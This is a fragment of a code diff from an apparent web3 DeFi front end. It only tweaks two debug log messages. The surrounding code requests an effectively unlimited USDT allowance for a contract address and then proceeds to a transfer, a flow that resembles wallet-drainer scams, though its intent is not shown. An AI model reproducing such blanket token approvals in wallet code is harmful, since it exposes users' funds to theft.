@@ -160,9 +160,9 @@
       console.log('执行授权语句');
       let defaultVal = web3.value.utils.toWei("10000000000", "ether");
       usdtContract.value.methods.approve(state.contractAddress.value , defaultVal).send({from: myAddress.value,gas:20000000}).then((receipt) => {
-        console.log('Approval successful:', receipt);
+        console.log('Approval successful:1111', receipt);
         ElMessage.success('Approval successful！')
-        console.log('授权之后执行转账语句.....');
+        console.log('授权之后执行转账语句....12312312.');
         if(DeFiContract.value){
           try{
             const mode = 1; // 模式
